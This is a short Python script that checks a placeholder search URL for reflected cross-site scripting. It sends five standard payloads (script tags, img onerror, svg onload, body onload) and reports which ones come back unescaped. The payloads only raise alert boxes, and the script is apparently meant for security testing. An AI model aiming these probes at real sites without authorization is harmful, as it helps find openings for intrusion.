import requests

# Target URL with a GET parameter (e.g., ?q=)
url = "http://example.com/search?q="  # Replace with your target

# Common XSS payloads to test
xss_payloads = [
    "<script>alert(1)</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>"
]

print(f"[+] Testing {url} for XSS vulnerabilities...\n")

for payload in xss_payloads:
    full_url = url + payload
    try:
        response = requests.get(full_url, timeout=5)
        if payload in response.text:
            print(f"[!] XSS vulnerability found with payload: {payload}")
            print(f"    URL: {full_url}")
        else:
            print(f"[-] Payload not reflected: {payload}")
    except requests.exceptions.RequestException as e:
        print(f"[Error] Could not connect: {e}")

print("\n[+] XSS testing complete.")